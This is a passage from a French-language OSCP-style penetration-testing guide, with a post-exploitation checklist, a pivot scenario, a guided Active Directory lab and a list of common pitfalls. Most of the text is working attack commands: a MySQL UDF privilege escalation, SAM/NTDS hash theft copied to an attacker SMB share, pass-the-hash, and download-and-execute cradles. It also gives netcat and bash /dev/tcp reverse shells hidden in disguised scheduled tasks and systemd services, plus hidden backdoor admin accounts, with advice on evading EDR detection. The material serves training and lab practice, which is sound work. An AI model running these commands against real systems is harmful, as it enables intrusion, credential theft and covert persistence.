   - Windows : `systeminfo | findstr /B /C:"OS" && whoami /all`
   - Linux : `uname -a && cat /etc/issue && id`

2. Évaluer le réseau immédiat
   - Windows : `ipconfig /all && route print && arp -a`
   - Linux : `ifconfig -a && ip route && ip neigh`

3. Identifier les processus et services intéressants
   - Windows : `netstat -ano && tasklist /SVC`
   - Linux : `netstat -tuln && ps aux`

4. Vérifier les utilisateurs et l'activité du système
   - Windows : `net user && quser && net localgroup Administrators`
   - Linux : `who && last && cat /etc/passwd | grep /bin/bash`

### Phase 2 : Élévation de privilèges (10-15 minutes)

5. Rechercher des vecteurs d'élévation rapides
   - Windows : `systeminfo | findstr /B /C:"OS" /C:"Hotfix(s)"` (pour identifier les patchs manquants)
   - Linux : `sudo -l && find / -perm -4000 -type f 2>/dev/null` (pour identifier les binaires SUID)

6. Déployer des outils d'énumération automatisée si nécessaire
   - Windows : WinPEAS ou PowerUp
   - Linux : LinPEAS ou Linux Smart Enumeration

7. Exploiter le vecteur d'élévation identifié
   - Utiliser l'exploit approprié en fonction des vulnérabilités découvertes
   - Vérifier les privilèges obtenus après exploitation

### Phase 3 : Extraction de credentials (10-15 minutes)

8. Extraire les hachages et mots de passe locaux
   - Windows : Mimikatz (sekurlsa::logonpasswords) ou export SAM/SYSTEM
   - Linux : Copie de /etc/shadow ou utilisation de Mimipenguin

9. Rechercher des credentials stockés
   - Windows : Fichiers de configuration, registre, historique PowerShell
   - Linux : Fichiers .bash_history, .ssh/, configurations d'applications

10. Dans un environnement de domaine, extraire les tickets Kerberos et informations AD
    - Mimikatz (sekurlsa::tickets) ou Rubeus
    - PowerView pour énumération AD rapide

### Phase 4 : Persistance et pivoting (15-20 minutes)

11. Établir un mécanisme de persistance discret
    - Windows : Tâche planifiée ou service avec nom plausible
    - Linux : Cron job ou clé SSH

12. Configurer un tunnel pour le pivoting
    - Chisel, SSH ou socat selon les restrictions réseau
    - Vérifier la connectivité à travers le tunnel

13. Identifier les cibles de mouvement latéral
    - Scanner les sous-réseaux accessibles (nmap léger)
    - Vérifier les connexions et sessions existantes

14. Documenter les informations critiques
    - Credentials obtenus, chemins d'accès, configurations réseau
    - Points d'intérêt pour exploration ultérieure

Cette checklist est conçue comme un flux de travail séquentiel, chaque phase s'appuyant sur les résultats de la précédente. En suivant cette approche structurée, même un opérateur sous pression temporelle peut maximiser l'impact de sa post-exploitation tout en maintenant une conscience OPSEC appropriée.

## Scénario express : escalader puis pivoter vers un second subnet

Ce scénario pratique illustre une situation courante : vous avez obtenu un accès initial à un serveur web dans une DMZ, et vous devez élever vos privilèges puis pivoter vers le réseau interne pour atteindre des systèmes plus sensibles. L'ensemble du processus est conçu pour être réalisable en moins d'une heure.

### Contexte initial

- Accès obtenu : shell web (www-data) sur un serveur Ubuntu 20.04 dans la DMZ (192.168.1.10)
- Objectif : atteindre le réseau interne (10.0.0.0/24) et compromettre un serveur Windows

### Étape 1 : Reconnaissance initiale (5 minutes)

Dès l'obtention du shell, nous effectuons une reconnaissance rapide :

```bash
id
# Résultat : uid=33(www-data) gid=33(www-data) groups=33(www-data)

uname -a
# Résultat : Linux webserver 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

ip addr
# Résultat : eth0 192.168.1.10/24, eth1 10.0.0.10/24 (interface interne!)

netstat -tuln
# Résultat : plusieurs services en écoute, dont MySQL sur 3306
```

Cette reconnaissance initiale révèle deux informations cruciales : le serveur possède une interface sur le réseau interne (10.0.0.10), et MySQL est en cours d'exécution. Ces deux éléments seront exploités dans les étapes suivantes.

### Étape 2 : Élévation de privilèges via MySQL (10 minutes)

Nous tentons d'accéder à MySQL pour rechercher des credentials :

```bash
find / -name "wp-config.php" 2>/dev/null
# Résultat : /var/www/html/wp-config.php

cat /var/www/html/wp-config.php | grep DB_
# Résultat : 
# define('DB_NAME', 'wordpress');
# define('DB_USER', 'wordpress_user');
# define('DB_PASSWORD', 'StrongPassword123!');
# define('DB_HOST', 'localhost');
```

Nous utilisons ces credentials pour accéder à MySQL et vérifier si l'utilisateur a des privilèges étendus :

```bash
mysql -u wordpress_user -p'StrongPassword123!'
mysql> SELECT user, host, plugin FROM mysql.user;
# Résultat : 'root'@'localhost' avec plugin 'auth_socket'

mysql> exit
```

Nous découvrons que MySQL utilise auth_socket pour l'authentification root, ce qui permet une élévation via une UDF (User Defined Function) :

```bash
cd /tmp
echo -e '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void){setuid(0);setgid(0);system("/bin/bash");return 0;}' > privesc.c
gcc -o privesc privesc.c
chmod u+s privesc

mysql -u wordpress_user -p'StrongPassword123!'
mysql> use mysql;
mysql> create table pwn(line blob);
mysql> insert into pwn values(load_file('/tmp/privesc'));
mysql> select * from pwn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/privesc';
mysql> create function sys_exec returns integer soname 'privesc';
mysql> select sys_exec();
mysql> exit

/tmp/privesc
# Vérification : id
# Résultat : uid=0(root) gid=0(root) groups=0(root)
```

Nous avons maintenant un accès root sur le serveur.

### Étape 3 : Reconnaissance du réseau interne (10 minutes)

Avec les privilèges root, nous pouvons explorer le réseau interne :

```bash
# Installation de nmap si nécessaire
apt-get update && apt-get install -y nmap

# Scan rapide du réseau interne
nmap -sT -T4 --min-rate 1000 -p 22,80,445,3389 10.0.0.0/24
# Résultat : 
# 10.0.0.50 - ports 445 et 3389 ouverts (probablement un serveur Windows)
# 10.0.0.100 - port 445 ouvert (probablement un contrôleur de domaine)
```

Nous identifions deux cibles potentielles : un serveur Windows (10.0.0.50) et un probable contrôleur de domaine (10.0.0.100).

### Étape 4 : Préparation du pivoting (10 minutes)

Nous téléchargeons et configurons chisel pour établir un tunnel SOCKS :

```bash
# Sur notre machine d'attaque (192.168.0.5)
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gunzip chisel_1.7.7_linux_amd64.gz
chmod +x chisel_1.7.7_linux_amd64
./chisel_1.7.7_linux_amd64 server -p 8080 --reverse

# Sur le serveur compromis
cd /tmp
wget http://192.168.0.5/chisel_1.7.7_linux_amd64
chmod +x chisel_1.7.7_linux_amd64
./chisel_1.7.7_linux_amd64 client 192.168.0.5:8080 R:socks
```

Nous configurons ensuite proxychains sur notre machine d'attaque :

```bash
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
```

### Étape 5 : Mouvement latéral vers le serveur Windows (15 minutes)

Nous utilisons proxychains pour scanner le serveur Windows plus en détail :

```bash
proxychains nmap -sT -p 445,3389,5985 10.0.0.50
# Résultat : ports 445, 3389 et 5985 (WinRM) ouverts
```

La présence du port 5985 indique que WinRM est activé, ce qui pourrait permettre une connexion PowerShell à distance si nous avons des credentials valides.

Nous recherchons des credentials sur le serveur compromis :

```bash
grep -r "password" /var/www/
# Résultat : fichier de configuration avec credentials admin:P@ssw0rd123!
```

Nous tentons d'utiliser ces credentials pour accéder au serveur Windows via WinRM :

```bash
apt-get install -y python3-pip
pip3 install evil-winrm

proxychains evil-winrm -i 10.0.0.50 -u admin -p 'P@ssw0rd123!'
# Résultat : accès PowerShell obtenu!

# Dans la session WinRM
whoami
# Résultat : desktop-srv\admin (utilisateur local)

systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
# Résultat : Windows Server 2019 Standard
```

### Étape 6 : Élévation de privilèges sur le serveur Windows (10 minutes)

Dans notre session WinRM, nous vérifions les privilèges et groupes :

```powershell
whoami /all
# Résultat : l'utilisateur est membre du groupe "Backup Operators"
```

L'appartenance au groupe "Backup Operators" nous permet d'exploiter les privilèges de sauvegarde pour extraire des hachages NTLM :

```powershell
# Téléchargement de l'outil SeBackupPrivilege
IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.5/SeBackupPrivilegeUtils.ps1')

# Utilisation des privilèges de sauvegarde pour copier les ruches SAM et SYSTEM
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM C:\Users\admin\Documents\sam.save
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SYSTEM C:\Users\admin\Documents\system.save

# Transfert des fichiers vers notre machine d'attaque
# (via un serveur SMB temporaire sur notre machine)
net use Z: \\192.168.0.5\share
copy C:\Users\admin\Documents\sam.save Z:\
copy C:\Users\admin\Documents\system.save Z:\
```

Sur notre machine d'attaque, nous utilisons secretsdump.py pour extraire les hachages :

```bash
secretsdump.py -sam sam.save -system system.save LOCAL
# Résultat : hachages NTLM, dont celui de l'administrateur local
```

Nous utilisons ensuite le hachage de l'administrateur pour établir une session avec privilèges élevés :

```bash
proxychains evil-winrm -i 10.0.0.50 -u Administrator -H 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6'
# Résultat : session PowerShell avec privilèges administrateur
```

### Résultat final

En moins d'une heure, nous avons :
1. Élevé nos privilèges sur le serveur Linux initial (www-data → root)
2. Établi un tunnel pour pivoter vers le réseau interne
3. Découvert et accédé à un serveur Windows dans le second sous-réseau
4. Élevé nos privilèges sur ce serveur jusqu'à l'administrateur local

Cette progression rapide démontre l'efficacité d'une approche méthodique en post-exploitation, même sous contrainte temporelle. Les techniques utilisées sont relativement discrètes et exploitent des configurations courantes dans les environnements réels.

Le scénario illustre également l'importance de la chaîne complète : reconnaissance → élévation → extraction de credentials → pivoting → mouvement latéral → nouvelle élévation. Chaque étape s'appuie sur les informations et accès obtenus lors des précédentes, créant un effet d'amplification de la compromission initiale.
# Mini-lab guidé : Post-exploitation dans un environnement AD avec pivot Linux

Ce mini-lab guidé vous permettra de mettre en pratique les techniques de post-exploitation dans un environnement réaliste combinant Active Directory Windows Server 2019 et un serveur pivot Linux Ubuntu. Conçu pour être réalisable en 90 minutes, il couvre l'ensemble des compétences essentielles pour l'OSCP : énumération, dump de credentials, élévation de privilèges, persistance et pivoting.

## Objectifs pédagogiques

À l'issue de ce lab, vous serez capable de :
- Exploiter un accès initial pour énumérer efficacement un environnement Windows
- Extraire des credentials et les utiliser pour le mouvement latéral
- Établir des mécanismes de persistance discrets sur Windows et Linux
- Configurer un pivot à travers un serveur Linux pour accéder à des segments réseau isolés
- Appliquer les principes OPSEC pour minimiser la détection

## Prérequis et configuration du lab

### Architecture du lab

Le lab se compose de quatre machines virtuelles :
1. **Kali Linux** (192.168.56.10) - Votre machine d'attaque
2. **DC01** (192.168.56.100) - Contrôleur de domaine Windows Server 2019 (CORP.LOCAL)
3. **SRV01** (192.168.56.101) - Serveur membre Windows Server 2019
4. **PIVOT01** (192.168.56.102 / 10.0.0.102) - Serveur Ubuntu 20.04 avec deux interfaces réseau

Le serveur PIVOT01 possède une seconde interface (10.0.0.102) connectée à un réseau interne où se trouve une cinquième machine :
5. **INTERNAL01** (10.0.0.200) - Serveur Windows Server 2019 isolé

### Configuration des machines virtuelles

Vous pouvez configurer ce lab avec VirtualBox ou VMware. Voici les spécifications recommandées :

**Pour toutes les machines :**
- 2 CPU virtuels
- 4 Go de RAM (2 Go minimum pour les serveurs Linux)
- 50 Go d'espace disque

**Configuration réseau :**
- Réseau 1 : Host-only ou NAT Network (192.168.56.0/24)
- Réseau 2 (uniquement pour PIVOT01 et INTERNAL01) : Réseau interne "internal-net" (10.0.0.0/24)

**Images à utiliser :**
- Kali Linux : Dernière image officielle
- Windows Server 2019 : Image d'évaluation de Microsoft
- Ubuntu 20.04 Server : Image officielle

### Installation et préparation

1. **Configuration du contrôleur de domaine (DC01) :**
   - Installer Windows Server 2019
   - Configurer l'adresse IP statique 192.168.56.100
   - Installer le rôle Active Directory Domain Services
   - Promouvoir en contrôleur de domaine (Nouveau domaine : CORP.LOCAL)
   - Créer les utilisateurs suivants :
     - Administrator (déjà existant)
     - svc_backup (membre du groupe "Backup Operators")
     - john.doe (utilisateur standard)
     - jane.smith (membre du groupe "IT Support")

2. **Configuration du serveur membre (SRV01) :**
   - Installer Windows Server 2019
   - Configurer l'adresse IP statique 192.168.56.101
   - Joindre au domaine CORP.LOCAL
   - Installer le rôle Web Server (IIS)
   - Créer un partage SMB "Documents" accessible aux membres du groupe "IT Support"

3. **Configuration du serveur pivot (PIVOT01) :**
   - Installer Ubuntu 20.04 Server
   - Configurer les interfaces réseau :
     - eth0 : 192.168.56.102
     - eth1 : 10.0.0.102
   - Activer le routage IP : `echo 1 > /proc/sys/net/ipv4/ip_forward`
   - Installer SSH et configurer un utilisateur "devops" avec mot de passe "DevPassword2023!"
   - Installer Apache et créer une page web simple

4. **Configuration du serveur interne (INTERNAL01) :**
   - Installer Windows Server 2019
   - Configurer l'adresse IP statique 10.0.0.200 avec passerelle 10.0.0.102
   - Installer le rôle Web Server (IIS)
   - Créer un utilisateur local "admin" avec mot de passe "AdminPass2023!"

## Scénario du lab

Vous avez obtenu un accès initial au serveur SRV01 via un compte de service compromis (svc_backup). Votre mission est d'explorer l'environnement, d'élever vos privilèges, de compromettre le contrôleur de domaine, puis de pivoter à travers le serveur Linux pour atteindre le serveur interne isolé.

## Guide étape par étape

### Phase 1 : Énumération initiale depuis SRV01 (15 minutes)

1. **Connexion initiale à SRV01**

   Depuis votre Kali Linux, établissez une connexion RDP au serveur SRV01 avec les credentials du compte compromis :

   ```bash
   xfreerdp /v:192.168.56.101 /u:svc_backup /p:"Backup2023!" /d:CORP.LOCAL
   ```

2. **Énumération du système local**

   Ouvrez une invite de commande PowerShell et exécutez les commandes suivantes :

   ```powershell
   # Informations système
   systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
   
   # Utilisateur actuel et privilèges
   whoami /all
   
   # Utilisateurs locaux et domaine
   net user /domain
   net group /domain
   
   # Connexions réseau
   ipconfig /all
   netstat -ano
   ```

   **Point d'attention OPSEC :** Ces commandes natives génèrent des logs d'événements Windows, mais sont considérées comme des activités administratives légitimes et rarement surveillées.

3. **Énumération Active Directory avec PowerView**

   Téléchargez et exécutez PowerView pour une énumération plus approfondie du domaine :

   ```powershell
   # Contourner la politique d'exécution PowerShell
   Set-ExecutionPolicy Bypass -Scope Process -Force
   
   # Télécharger et exécuter PowerView en mémoire
   IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10/PowerView.ps1')
   
   # Énumérer les ordinateurs du domaine
   Get-NetComputer -FullData | Select-Object dnshostname,operatingsystem
   
   # Énumérer les utilisateurs du domaine
   Get-NetUser | Select-Object samaccountname,description,memberof
   
   # Identifier les sessions actives sur le DC
   Get-NetSession -ComputerName DC01
   ```

   **Point d'attention OPSEC :** L'exécution de PowerView est considérée comme suspecte par les solutions EDR modernes. Dans un environnement réel, vous devriez utiliser une version obfusquée ou des commandes natives lorsque possible.

4. **Découverte du serveur pivot**

   Lors de votre énumération, vous découvrez l'existence du serveur pivot :

   ```powershell
   # Vérifier les routes réseau
   route print
   
   # Scanner le réseau local
   1..254 | ForEach-Object { ping -n 1 -w 100 192.168.56.$_ | Select-String "Reply" }
   
   # Identifier les services sur le serveur pivot
   Test-NetConnection -ComputerName 192.168.56.102 -Port 22
   Test-NetConnection -ComputerName 192.168.56.102 -Port 80
   ```

### Phase 2 : Élévation de privilèges et dump de credentials (20 minutes)

1. **Exploitation des privilèges de sauvegarde**

   Le compte svc_backup est membre du groupe "Backup Operators", ce qui lui confère des privilèges spéciaux pour accéder aux fichiers système :

   ```powershell
   # Créer un répertoire temporaire
   mkdir C:\Temp
   cd C:\Temp
   
   # Télécharger l'utilitaire SeBackupPrivilege
   IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10/SeBackupPrivilegeUtils.ps1')
   
   # Activer le privilège de sauvegarde
   Set-SeBackupPrivilege
   
   # Copier les ruches SAM et SYSTEM
   Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM C:\Temp\sam.save
   Copy-FileSeBackupPrivilege C:\Windows\System32\config\SYSTEM C:\Temp\system.save
   ```

   **Point d'attention OPSEC :** L'utilisation des privilèges de sauvegarde est moins suspecte que l'exécution d'outils comme Mimikatz, car elle utilise des fonctionnalités légitimes de Windows.

2. **Transfert des fichiers vers Kali**

   Configurez un serveur SMB sur votre Kali pour récupérer les fichiers :

   ```bash
   # Sur Kali
   mkdir /tmp/share
   impacket-smbserver -smb2support share /tmp/share
   ```

   ```powershell
   # Sur SRV01
   copy C:\Temp\sam.save \\192.168.56.10\share\
   copy C:\Temp\system.save \\192.168.56.10\share\
   ```

3. **Extraction des hachages avec Impacket**

   Sur votre Kali, utilisez secretsdump.py pour extraire les hachages :

   ```bash
   cd /tmp/share
   impacket-secretsdump -sam sam.save -system system.save LOCAL
   ```

   Notez les hachages NTLM des comptes locaux pour une utilisation ultérieure.

4. **Accès au contrôleur de domaine**

   Utilisez les privilèges de sauvegarde pour extraire les credentials du domaine depuis le DC :

   ```powershell
   # Sur SRV01, accéder au DC avec les privilèges actuels
   cd C:\Temp
   
   # Copier les ruches NTDS et SYSTEM du DC
   Copy-FileSeBackupPrivilege \\DC01\C$\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
   Copy-FileSeBackupPrivilege \\DC01\C$\Windows\System32\config\SYSTEM C:\Temp\dc-system.save
   
   # Transférer les fichiers vers Kali
   copy C:\Temp\ntds.dit \\192.168.56.10\share\
   copy C:\Temp\dc-system.save \\192.168.56.10\share\
   ```

5. **Extraction des hachages du domaine**

   Sur Kali, extrayez les hachages du domaine :

   ```bash
   cd /tmp/share
   impacket-secretsdump -ntds ntds.dit -system dc-system.save LOCAL
   ```

   Vous obtenez maintenant les hachages NTLM de tous les utilisateurs du domaine, y compris l'administrateur du domaine.

### Phase 3 : Persistance sur le domaine Windows (15 minutes)

1. **Accès administrateur au domaine**

   Utilisez le hachage NTLM de l'administrateur du domaine pour établir une session avec privilèges élevés :

   ```bash
   # Sur Kali
   impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 CORP.LOCAL/Administrator@192.168.56.100
   ```

   Vous avez maintenant un shell SYSTEM sur le contrôleur de domaine.

2. **Création d'un utilisateur administrateur caché**

   Créez un compte administrateur discret pour la persistance :

   ```cmd
   # Créer un utilisateur caché
   net user support_admin P@ssw0rd123! /add /domain
   net group "Domain Admins" support_admin /add /domain
   
   # Masquer l'utilisateur des listes
   reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v support_admin /t REG_DWORD /d 0 /f
   ```

3. **Mise en place d'une tâche planifiée pour la persistance**

   Créez une tâche planifiée qui établit une connexion inverse à intervalles réguliers :

   ```cmd
   # Créer un répertoire caché
   mkdir C:\Windows\System32\Tasks\Microsoft\Windows\PLA\System
   
   # Télécharger un reverse shell
   certutil -urlcache -split -f "http://192.168.56.10/nc64.exe" C:\Windows\System32\Tasks\Microsoft\Windows\PLA\System\diagtrack.exe
   
   # Créer une tâche planifiée
   schtasks /create /tn "\Microsoft\Windows\PLA\System\SystemDiagnosticTask" /tr "C:\Windows\System32\Tasks\Microsoft\Windows\PLA\System\diagtrack.exe 192.168.56.10 4444 -e cmd.exe" /sc daily /st 18:00 /ru "SYSTEM" /f
   ```

   **Point d'attention OPSEC :** Cette tâche planifiée utilise un nom plausible et est placée dans un sous-répertoire légitime pour éviter la détection. Dans un environnement réel, vous devriez utiliser des noms encore plus discrets et des chemins moins suspects.

### Phase 4 : Compromission du serveur pivot Linux (15 minutes)

1. **Reconnaissance du serveur pivot**

   Depuis le contrôleur de domaine, effectuez une reconnaissance du serveur pivot :

   ```cmd
   ping 192.168.56.102
   nmap -p 22,80,443 192.168.56.102
   ```

2. **Tentative d'accès SSH avec les credentials récupérés**

   Essayez de vous connecter au serveur pivot avec les credentials découverts précédemment :

   ```bash
   # Sur Kali
   ssh devops@192.168.56.102
   # Mot de passe: DevPassword2023!
   ```

3. **Énumération du serveur Linux**

   Une fois connecté, effectuez une énumération du système :

   ```bash
   # Informations système
   uname -a
   cat /etc/issue
   
   # Utilisateurs et privilèges
   id
   sudo -l
   
   # Configuration réseau
   ifconfig -a
   ip route
   
   # Processus et services
   netstat -tuln
   ps aux
   ```

   Vous découvrez que le serveur possède deux interfaces réseau et fait office de passerelle vers un réseau interne (10.0.0.0/24).

4. **Élévation de privilèges via sudo**

   Exploitez les privilèges sudo pour obtenir un accès root :

   ```bash
   # Vérifier les droits sudo
   sudo -l
   
   # Résultat : l'utilisateur peut exécuter /usr/bin/find en tant que root
   
   # Exploiter find pour obtenir un shell root
   sudo find /etc -name passwd -exec /bin/bash \;
   
   # Vérifier les privilèges
   id
   # Résultat : uid=0(root) gid=0(root) groups=0(root)
   ```

5. **Mise en place d'une persistance Linux**

   Établissez plusieurs mécanismes de persistance sur le serveur pivot :

   ```bash
   # Ajout d'une clé SSH pour l'utilisateur root
   mkdir -p /root/.ssh
   echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." > /root/.ssh/authorized_keys
   chmod 600 /root/.ssh/authorized_keys
   
   # Création d'un service systemd caché
   cat > /etc/systemd/system/system-monitor.service << EOF
   [Unit]
   Description=System Monitoring Service
   After=network.target
   
   [Service]
   Type=simple
   ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.10/5555 0>&1'
   Restart=always
   RestartSec=60
   
   [Install]
   WantedBy=multi-user.target
   EOF
   
   # Activer le service
   systemctl enable system-monitor.service
   systemctl start system-monitor.service
   ```

   **Point d'attention OPSEC :** Dans un environnement réel, vous devriez utiliser des noms de service plus discrets et des connexions moins fréquentes pour éviter la détection.

### Phase 5 : Pivoting vers le réseau interne (25 minutes)

1. **Découverte du réseau interne**

   Depuis le serveur pivot, explorez le réseau interne :

   ```bash
   # Scanner le réseau interne
   for i in {1..254}; do ping -c 1 -W 1 10.0.0.$i | grep "64 bytes"; done
   
   # Scanner les ports du serveur interne découvert
   nmap -p 80,445,3389 10.0.0.200
   ```

   Vous découvrez un serveur Windows (10.0.0.200) dans le réseau interne.

2. **Configuration du pivot SSH**

   Configurez un tunnel SSH pour accéder au réseau interne depuis votre Kali :

   ```bash
   # Sur Kali
   ssh -D 1080 devops@192.168.56.102
   ```

   Configurez proxychains pour utiliser ce tunnel :

   ```bash
   # Modifier /etc/proxychains.conf
   echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
   ```

3. **Reconnaissance du serveur interne via le pivot**

   Utilisez proxychains pour scanner le serveur interne :

   ```bash
   # Sur Kali
   proxychains nmap -sT -Pn -p 80,445,3389,5985 10.0.0.200
   ```

   Vous découvrez que les ports 80 (HTTP), 445 (SMB), 3389 (RDP) et 5985 (WinRM) sont ouverts.

4. **Tentative d'accès avec les credentials découverts**

   Essayez d'accéder au serveur interne avec les credentials locaux découverts :

   ```bash
   # Sur Kali
   proxychains impacket-psexec -port 445 Administrator:AdminPass2023!@10.0.0.200
   ```

   Si cette tentative échoue, essayez d'autres méthodes d'accès :

   ```bash
   # Tentative avec WinRM
   proxychains evil-winrm -i 10.0.0.200 -u admin -p 'AdminPass2023!'
   ```

5. **Configuration d'un tunnel pour RDP**

   Pour une interface graphique, configurez un tunnel pour RDP :

   ```bash
   # Sur Kali
   ssh -L 13389:10.0.0.200:3389 devops@192.168.56.102
   
   # Dans un autre terminal
   xfreerdp /v:localhost:13389 /u:admin /p:AdminPass2023!
   ```

6. **Établissement d'une persistance sur le serveur interne**

   Une fois connecté au serveur interne, établissez une persistance :

   ```powershell
   # Créer un utilisateur local caché
   net user backdoor P@ssw0rd456! /add
   net localgroup Administrators backdoor /add
   
   # Masquer l'utilisateur
   reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0 /f
   
   # Configurer un reverse shell persistant
   mkdir C:\ProgramData\Microsoft\Windows\SystemData
   
   # Télécharger netcat
   certutil -urlcache -split -f "http://192.168.56.10/nc64.exe" C:\ProgramData\Microsoft\Windows\SystemData\svchost.exe
   
   # Créer une tâche planifiée
   schtasks /create /tn "\Microsoft\Windows\Multimedia\SystemAudioTask" /tr "C:\ProgramData\Microsoft\Windows\SystemData\svchost.exe 10.0.0.102 6666 -e cmd.exe" /sc daily /st 20:00 /ru "SYSTEM" /f
   ```

### Conclusion du lab et nettoyage

1. **Vérification des objectifs**

   Assurez-vous d'avoir accompli tous les objectifs du lab :
   - Énumération de l'environnement Windows
   - Extraction de credentials
   - Élévation de privilèges sur Windows et Linux
   - Établissement de mécanismes de persistance
   - Configuration d'un pivot pour accéder au réseau interne

2. **Documentation des résultats**

   Documentez les informations clés obtenues :
   - Comptes et hachages découverts
   - Vulnérabilités exploitées
   - Mécanismes de persistance établis
   - Configuration réseau

3. **Nettoyage (optionnel)**

   Si vous souhaitez réinitialiser le lab pour une future utilisation :
   - Supprimez les utilisateurs créés
   - Supprimez les tâches planifiées
   - Supprimez les fichiers téléchargés
   - Arrêtez les services malveillants

## Défis supplémentaires

Pour les participants souhaitant aller plus loin, voici quelques défis supplémentaires :

1. **Défi OPSEC :** Refaites le lab en utilisant uniquement des outils natifs et des techniques Living Off The Land pour minimiser la détection.

2. **Défi Défense :** Configurez des mécanismes de détection (Sysmon, auditd) et tentez d'accomplir les mêmes objectifs sans déclencher d'alertes.

3. **Défi Pivoting avancé :** Configurez une chaîne de pivots plus complexe en ajoutant un serveur supplémentaire dans un troisième segment réseau.

## Ressources complémentaires

- [Guide d'énumération Active Directory](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
- [Techniques de pivoting avancées](https://pentest.blog/explore-hidden-networks-with-double-pivoting/)
- [OPSEC pour les tests d'intrusion](https://github.com/vysecurity/RedTips)

Ce mini-lab vous a permis de mettre en pratique l'ensemble des techniques de post-exploitation dans un environnement réaliste. Les compétences acquises sont directement applicables aux examens comme l'OSCP et aux missions de test d'intrusion réelles.
# Pièges classiques en post-exploitation

La phase de post-exploitation est semée d'embûches qui peuvent compromettre votre mission ou révéler votre présence aux équipes de défense. Cette section présente les erreurs les plus courantes commises par les pentesteurs, même expérimentés, et propose des stratégies pour les éviter.

## Erreurs techniques et opérationnelles

### Sous-estimation des logs et de la surveillance

L'une des erreurs les plus fréquentes consiste à sous-estimer les capacités de détection des environnements modernes. De nombreux pentesteurs, habitués aux environnements de laboratoire ou aux systèmes mal surveillés, adoptent une approche trop agressive qui déclenche rapidement des alertes.

Les solutions EDR (Endpoint Detection and Response) modernes ne se contentent plus de signatures statiques, mais analysent les comportements, les séquences d'actions et les anomalies statistiques. Par exemple, l'exécution de Mimikatz peut passer inaperçue si vous utilisez une version obfusquée, mais l'accès au processus LSASS avec certains droits sera détecté indépendamment de l'outil utilisé.

Pour éviter ce piège, adoptez une approche progressive et prudente. Commencez par des techniques discrètes et n'escaladez vers des méthodes plus bruyantes que si nécessaire. Prenez le temps d'identifier les solutions de sécurité déployées (via des artefacts comme les processus en cours d'exécution ou les services) et adaptez votre stratégie en conséquence.

### Négligence du nettoyage des artefacts

De nombreux pentesteurs se concentrent sur l'obtention d'accès et la collecte d'informations, mais négligent de nettoyer les traces laissées sur les systèmes compromis. Ces artefacts peuvent inclure :

- Fichiers temporaires créés lors du transfert d'outils
- Entrées dans l'historique des commandes
- Logs de connexion et d'authentification
- Processus orphelins ou suspendus
- Modifications de configuration non restaurées

Cette négligence facilite la détection a posteriori et peut compromettre l'ensemble de l'opération. Dans le contexte de l'OSCP, elle peut également entraîner une pénalité si l'examinateur constate que vous n'avez pas respecté les bonnes pratiques.

Pour éviter ce piège, documentez systématiquement chaque modification apportée aux systèmes cibles et prévoyez une phase de nettoyage à la fin de chaque session. Utilisez des scripts ou des checklists pour vous assurer de n'oublier aucun artefact.

### Dépendance excessive aux outils automatisés

Les outils d'énumération automatisée comme LinPEAS, WinPEAS ou BloodHound sont extrêmement utiles, mais leur utilisation systématique présente plusieurs risques :

- Ils génèrent un volume important d'activité système facilement détectable
- Ils peuvent manquer des vecteurs d'attaque non standard
- Ils peuvent provoquer des instabilités sur des systèmes fragiles
- Ils créent une dépendance qui atrophie les compétences manuelles

De nombreux pentesteurs débutants lancent ces outils par réflexe, sans réfléchir à leur pertinence dans le contexte spécifique de la mission.

Pour éviter ce piège, développez d'abord vos compétences en énumération manuelle. Utilisez les outils automatisés comme complément, pas comme substitut à votre propre analyse. Dans les environnements sensibles, privilégiez des vérifications ciblées plutôt que des scans exhaustifs.

### Tunnels et connexions mal configurés

Les erreurs de configuration des tunnels et des proxys sont fréquentes et peuvent entraîner des fuites d'informations ou des échecs de connexion. Les problèmes courants incluent :

- Oubli de spécifier l'option SOCKS lors de la configuration de proxychains
- Confusion entre tunneling local (-L) et distant (-R) avec SSH
- Établissement de connexions persistantes facilement détectables
- Utilisation de ports standards facilement filtrés ou surveillés

Ces erreurs peuvent non seulement compromettre votre discrétion, mais aussi vous faire perdre un temps précieux en debugging.

Pour éviter ce piège, testez toujours vos configurations de tunneling dans un environnement contrôlé avant de les déployer en situation réelle. Documentez les commandes qui fonctionnent pour chaque scénario et créez des templates réutilisables.

### Mouvement latéral sans reconnaissance préalable

Le mouvement latéral précipité, sans reconnaissance approfondie du réseau cible, peut conduire à des impasses ou à des détections prématurées. Cette erreur est particulièrement courante dans les environnements Active Directory, où la complexité des relations de confiance et des délégations peut créer des chemins d'attaque non évidents.

Par exemple, compromettre un serveur membre hautement surveillé peut déclencher des alertes, alors qu'une station de travail moins protégée pourrait offrir le même accès au domaine avec moins de risques.

Pour éviter ce piège, prenez le temps de cartographier l'environnement avant de vous déplacer. Identifiez les systèmes critiques, les relations de confiance, et les niveaux probables de surveillance. Planifiez votre progression en privilégiant les chemins de moindre résistance et de moindre visibilité.

## Erreurs stratégiques et méthodologiques

### Absence de priorisation et de planification

